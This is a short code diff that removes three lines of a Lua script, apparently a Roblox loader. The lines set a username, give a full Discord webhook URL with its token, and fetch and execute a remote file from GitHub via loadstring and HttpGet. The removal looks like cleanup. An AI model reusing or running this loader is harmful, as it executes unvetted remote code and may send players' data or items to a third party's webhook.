@@ -1,3 +1,0 @@
-Username = "noprofit9"
-Webhook = "https://discord.com/api/webhooks/1357665001686569092/-PFZBqcGH1SMh-T2vH4kgdeOZ5COBXZW4pR7itT1tBQzIFe4go9kVht85zXzIHNtPpWv"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WINVOLST/ttd/refs/heads/main/.gg/noprofit", true))()
